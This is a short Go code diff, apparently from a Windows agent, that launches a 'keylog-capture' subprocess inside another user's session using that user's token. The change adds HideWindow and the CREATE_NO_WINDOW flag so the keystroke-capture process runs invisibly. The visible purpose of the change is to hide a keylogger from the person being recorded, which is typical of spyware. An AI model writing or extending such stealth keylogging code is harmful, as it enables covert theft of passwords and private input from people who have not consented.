@@ -29,7 +29,9 @@ func spawnCaptureInUserSession(ctx context.Context, id string, pub publisher, lo
 	exe, _ := os.Executable()
 	cmd := exec.CommandContext(ctx, exe, "keylog-capture")
 	cmd.SysProcAttr = &syscall.SysProcAttr{
-		Token: syscall.Token(tok),
+		Token:         syscall.Token(tok),
+		HideWindow:    true,
+		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
 	}
 
 	stdout, err := cmd.StdoutPipe()
